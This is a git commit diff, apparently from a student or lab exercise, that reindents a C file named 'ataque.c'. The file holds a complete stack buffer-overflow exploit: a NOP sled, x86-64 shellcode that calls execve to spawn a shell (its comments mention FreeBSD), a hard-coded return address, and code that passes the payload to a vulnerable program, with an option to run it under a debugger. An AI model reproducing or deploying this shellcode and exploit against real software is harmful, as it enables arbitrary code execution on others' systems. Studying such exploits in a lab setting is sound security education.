855cda84faabcbb108c6ccd82e81138407f2500d
marcosChoucino <103415487+marcosChoucino@users.noreply.github.com>
2025-04-01 20:57:28 +0200

    mejor indentado

--- ataque.c
+++ ataque.c
@@ -9,9 +9,9 @@ int main() {
         unsigned char shellcode[] =
         //PRIMERO UN POCO DE RELLENO:
 
-    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
-    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
-    "\x90\x90\x90"
+        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+        "\x90\x90\x90"
         //Shelcode:
         "\x48\x31\xd2"  //xor  rdx,
         "\x48\x31\xc0"  //xor rax rax
@@ -24,27 +24,21 @@ int main() {
         "\x48\x89\xe6"  // mov    rsi, rsp
         "\xb0\x3b"              // mov    al, 59 (execve syscall FreeBSD)
         "\x0f\x05"              // syscall
-    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
-    "\x90"
+        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+        "\x90"
         //DESPUES EL RELLENO
         //PARA TERMINAR LA DIRECCION A LA QUE SALTAR:
-        //ooo
-    "\x40\xd9\xff\xff\xff\x7f";// direccion de memoria a la que saltar
+        "\x40\xd9\xff\xff\xff\x7f";// direccion de memoria a la que saltar
 
 
     char *args1[] = { programVul, shellcode, NULL };  // Argumentos a pasar sin debuguear
     char *args2[] = { debugguer,"--args",programVul, shellcode, NULL };  // Argumentos a pasar debugueando
     printf("Ejecutando %s con argumentos ...\n", programVul);
         if(debugueando){
-    execvp(debugguer, args2);  // Ejecuta el programa con argumentos
+            execvp(debugguer, args2);  // Ejecuta el programa con argumentos
         }else{
-
-    execvp(programVul, args1);  // Ejecuta el programa con argumentos
-
+            execvp(programVul, args1);  // Ejecuta el programa con argumentos
         }
-
-
-
     // Si execvp falla, mostramos un error
     return 1;
 }
